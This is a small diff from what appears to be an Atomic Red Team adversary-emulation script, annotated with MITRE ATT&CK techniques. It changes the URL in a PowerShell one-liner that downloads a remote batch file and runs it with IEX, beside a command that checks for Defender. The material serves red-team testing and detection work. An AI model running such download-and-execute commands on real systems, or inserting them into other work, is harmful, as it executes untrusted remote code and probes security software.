@@ -36,7 +36,7 @@ tasklist.exe | findstr defender
 :: Technique: PowerShell: https://attack.mitre.org/wiki/Technique/T1086
 :: Technique: Multiple Discovery
 
-powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat')"
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')"
 
 :: Tactic: Collection
 :: Technique: Automated Collection: https://attack.mitre.org/wiki/Technique/T1119
